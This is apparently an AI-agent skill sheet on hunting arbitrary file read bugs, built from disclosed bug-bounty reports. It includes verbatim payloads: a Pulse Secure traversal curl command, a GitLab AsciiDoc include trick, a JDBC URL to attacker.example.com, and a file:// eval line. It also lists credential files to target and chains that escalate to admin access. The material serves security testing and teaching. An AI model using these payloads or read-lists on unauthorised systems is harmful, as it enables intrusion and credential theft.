---
name: hunter-l3-arbitrary-file-read
description: "Use when hunting Arbitrary File Read on a target. Loads the L3 technique sheet: Arbitrary File Read (AFR) is the class where an attacker makes a server (or privileged client/desktop component) return the contents of a file it was never supposed to expose — via unsanitized path pa"
domain: cybersecurity
subdomain: web
tags:
- web
- arbitrary-file-read
- hunting
- l3
version: '1.0'
---

# Arbitrary File Read — Technique Sheet

## Overview
Arbitrary File Read (AFR) is the class where an attacker makes a server (or privileged client/desktop component) return the contents of a file it was never supposed to expose — via unsanitized path parameters, path traversal in URL routes, server-side template/render pipelines (AsciiDoc/ffmpeg/JDBC), import/parsers, or known CVEs in edge appliances. It pays directly (credentials, DB config, source code) and pays harder as a chain primer: read `secret_key_base`, DB credentials, or cached password DBs, then escalate to auth bypass or RCE. Expect triage resistance on the generic `filename=` shape — the differentiated value is in the render/import/client-side variants below.

## Distinct sub-patterns

### 1. Direct unsanitized `filename` parameter (black-box web)
- Endpoint shape: `GET /<path>?filename=<file>` — multiple endpoints on the same asset accepted the parameter with no sanitization.
- Payload (verbatim): `/etc/passwd` (as the `filename` value).
- Root cause: server concatenates the user-controlled `filename` into a file-open/serve path with no canonicalization or allowlist.
- Impact: program-confirmed arbitrary file reads via multiple endpoints on a DoD public-facing asset.
- Exemplars: 1436223 (U.S. Dept Of Defense).

### 2. Path traversal in URL route (pre-auth, appliance) — Pulse Secure CVE-2019-11510
- Endpoint shape (verbatim):
  `GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/`
  Reproduce with `--path-as-is` so curl doesn't normalize the `../`:
  `curl -i -k --path-as-is https://██████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/`
- Payload: target file appended after traversal (`/etc/passwd`).
- Root cause: the front-door proxy/router fails to normalize `..` segments in `/dana-na/` paths before the html5acc/guacamole handler serves the resolved file. Unauthenticated.
- Impact: full `/etc/passwd` pre-auth on multiple DoD assets (root, nfast, bin, nobody, dns, term accounts observed).
- Exemplars: 678496, 695005, 696276 (U.S. Dept Of Defense); also 591295 (X/xAI) via `welcome.cgi`.

### 3. Pre-auth AFR on Pulse Secure via `welcome.cgi` (CVE-2019-11510)
- Endpoint shape: `GET /dana-na/auth/url_default/welcome.cgi` (no parameter needed).
- Payload (verbatim target list):
  `/etc/passwd`, `/etc/hosts`, `/data/runtime/mtmp/system`, `/data/runtime/mtmp/lmdb/dataa/data.mdb`, `/data/runtime/mtmp/lmdb/randomVal/data.mdb`
- Root cause: unauthenticated arbitrary file download primitive in Pulse Secure before patching.
- Impact: read VPN user file (`mtmp/system`) and the cached plaintext-password LMDB (`dataa/data.mdb`) — many staff usernames and plain-text passwords.
- Exemplars: 591295 (X / xAI), 617543 (Uber — chain of Pulse 0-days, payload not stated).

### 4. AsciiDoc `counter` directive re-enabling a disabled attribute (GitLab plantuml/kroki)
- Endpoint shape: `POST /{namespace}/{project}/wikis` — AsciiDoc wiki page containing a plantuml diagram block.
- Payload (verbatim):
```
[#goals]

[plantuml, test="{counter:kroki-plantuml-include:/etc/passwd}", format="png"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- {counter:kroki-plantuml-include}
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```
- Root cause: GitLab disables the `kroki-plantuml-include` attribute server-side, but asciidoctor's `counter` directive lets the document define a counter with that exact name, overriding the disabled attribute. The resulting value is used server-side with `File#read` as a file path inside the diagram pipeline.
- Impact: the generated (base64+zlib-encoded) diagram URL contains the file content — decode it to recover `/etc/passwd` from the GitLab server.
- Exemplar: 1098793 (GitLab).
- Note the exfil channel: data rides out through the encoded kroki URL, not the response body.

### 5. JSON schema validator → open-uri read during project import (GitLab)
- Endpoint shape: `POST /api/v4/projects/import` with a crafted `import.tar.gz` (GitLab export format).
- Payload: not stated beyond the crafted export archive.
- Root cause: misuse of a JSON schema validator during import; the validator's handling of remote references (open-uri) lets a value in the crafted export trigger a server-side fetch/read of an arbitrary file path. Reads are limited to ~250 bytes per read.
- Impact: leaked GitLab.com production database connection info; ~250 bytes of any file including Rails `secret_key_base` and DB/SMTP credentials. On self-hosted instances, reading `.gitlab_shell_token` enables issuing an admin personal access token.
- Exemplar: 1132378 (GitLab).

### 6. ffmpeg HLS playlist → local file render (media upload pipeline)
- Endpoint shape: `POST /photos/upload` (video upload; server runs ffmpeg to generate a preview).
- Payload: HLS playlist (`.m3u8`) referencing an external/local file so ffmpeg's HLS parser reads it during preview generation. Verbatim playlist not stated.
- Root cause: ffmpeg's HLS demuxer follows playlist entries pointing at arbitrary URIs, including local files, when the server transcodes/previews uploaded media.
- Impact: uploaded video rendered the contents of `/etc/passwd` in the Photostream/cameraroll view on Flickr; the same primitive also escalates to SSRF.
- Exemplar: 487008 (Flickr).

### 7. Malicious JDBC server → server-side file read (Airflow Spark provider)
- Endpoint shape: `SparkJDBCHook` JDBC connection string (attacker-modifiable Spark connection config when authentication is not enabled).
- Payload (verbatim):
  `jdbc:mysql://attacker.example.com:3306/db?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`
- Root cause: Apache Airflow Spark provider (< 4.0.1) does not filter malicious schema/JDBC URL parameters in `SparkJDBCHook`. Pointing the hook at an attacker-controlled MySQL server (with `autoDeserialize`) lets the server read arbitrary files from the Airflow host via the MySQL protocol.
- Impact: demonstrated arbitrary file read from the Airflow server; RCE via malicious deserialized data was attempted but not successfully verified — report the AFR, don't claim the RCE.
- Exemplar: 1966083 (Internet Bug Bounty).

### 8. Container escape via symlink in build config (CI build worker)
- Endpoint shape: `.lgtm.yml` in an LGTM build — include a symlink to a host path; the build worker resolves it outside the container. Exact manifest payload not stated.
- Root cause: symlink planted by the build config escapes the build container, so the worker reads arbitrary host-machine files.
- Impact: PoC read `/etc/passwd` from the host machine.
- Exemplar: 697055 (Semmle).

### 9. Client-side `file://` read via privileged popup (desktop app)
- Endpoint shape: Rocket.Chat-Desktop with the client connected to an attacker-controlled server; "Custom Script for Logged In Users" runs in the client. Trigger via `window.open`.
- Payload (verbatim):
  `window.open('file://c:/windows/system32/drivers/etc/hosts').eval('alert(document.body.innerText);');`
- Root cause: the desktop app allowed popups from a configured (malicious) server to open `file://` URLs in a privileged context; `eval` in that window reads DOM content back.
- Impact: read and displayed `c:/windows/system32/drivers/etc/hosts` on the victim's machine via alert.
- Exemplar: 943737 (Rocket.Chat).
- Note: this is the only client-side pattern in the set — AFR isn't always a server bug.

## Bypass / chain notes
- Path normalization bypass: `--path-as-is` (curl) or equivalent is essential — user-agent/client-side `../` normalization will silently defeat the traversal (IDs 678496/695005/696276). Traversal preceded a benign path segment (`/dana-na/../dana/html5acc/guacamole/../../…`) rather than raw `../` at root.
- Exfil-channel selection matters: GitLab 1098793 exfiltrated via the base64+zlib kroki diagram URL; 1132373-style import bugs exfiltrate via error/reflection in ~250-byte chunks — chunked reads are viable, just iterate.
- Proven chains in the records:
  - Pre-auth AFR → read `/data/runtime/mtmp/lmdb/dataa/data.mdb` → plaintext staff credentials → authenticate to the VPN (678496, 591295).
  - AFR → read `.gitlab_shell_token` (self-hosted) → mint admin personal access token (1132378).
  - ffmpeg HLS local-file read → SSRF escalation (487008).
  - Malicious-server prerequisite chains: attacker-controlled Rocket.Chat server → custom script → `file://` read (943737); attacker-modified Spark config → malicious MySQL → host file read (1966083).
  - `.lgtm.yml` symlink → build-worker container escape → host file read (697055).
- `autoDeserialize=true&queryInterceptors=…` in the JDBC URL is the parameter combo that turns a connect-back into a read primitive.

## Gotchas / what NOT to do
- Don't claim RCE you haven't verified: in 1966083 deserialization RCE was attempted but not confirmed — the accepted finding was the file read. Report the demonstrated primitive.
- Don't let your HTTP client normalize traversal before sending; a plain `curl https://host/dana-na/../…` will fix up the path and miss the bug. Use `--path-as-is` and `-k` on self-signed appliances.
- Don't test only `/etc/passwd` as the end goal — the records show impact comes from the *second* file: `dataa/data.mdb`, `.gitlab_shell_token`, `secret_key_base`, DB creds. Plan the read-list.
- Don't assume one read is the limit: the GitLab import bug is ~250 bytes per read — repeat/iterate rather than dismissing it as partial.
- Don't overlook client-side/desktop scopes: a `file://` popup in an Electron-class app is a valid AFR finding (943737).
- Known-CVE appliances (Pulse Secure) were still accepted across multiple DoD programs — unpatched CVE instances on in-scope assets are reportable; don't self-reject.
- For render-pipeline bugs (AsciiDoc/ffmpeg), the payload must survive the specific renderer's syntax — use the verbatim block structure (attribute line + `....` literal block) rather than paraphrasing.

## Real-world impact examples
- GitLab.com production DB connection info + Rails `secret_key_base` + DB/SMTP credentials readable (~250 B chunks); self-hosted: `.gitlab_shell_token` → admin PAT (1132378).
- Flickr Photostream/cameraroll publicly rendering `/etc/passwd` contents from an uploaded video (487008); SSRF escalation possible.
- DoD Pulse Secure instances: full `/etc/passwd` pre-auth on three separate assets (678496, 695005, 696276), plus cached plaintext password DB → staff credential compromise (591295, 678496).
- Uber VPN appliance file reading of sensitive files/session info via Pulse 0-day chain (617543).
- GitLab server `/etc/passwd` recovered by decoding the kroki diagram URL (1098793).
- LGTM build infrastructure: host-machine `/etc/passwd` read from inside a build container (697055).
- Rocket.Chat desktop users: local Windows file contents surfaced via alert from a malicious server's custom script (943737).